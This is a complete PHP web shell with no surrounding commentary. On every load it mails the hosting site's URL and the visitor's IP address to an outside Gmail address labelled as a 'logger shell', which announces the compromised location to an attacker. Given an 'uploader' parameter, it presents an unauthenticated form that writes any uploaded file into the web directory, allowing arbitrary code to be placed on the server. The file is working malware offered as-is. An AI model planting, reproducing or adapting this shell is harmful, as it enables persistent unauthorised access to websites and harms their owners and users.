<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'haxxorcyberarmy@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "[+] LOGGER SHELL [+]", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
if(isset($_GET["uploader"])){

  echo"<br><form method=post enctype=multipart/form-data>"; 
  echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 
	if($_POST["k"]==upload){ 
	  	if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
			echo"<b>".$_FILES["f"]["name"];
		}
		else{
			echo"<b>Gagal upload cok";
		}
	} 
}

?>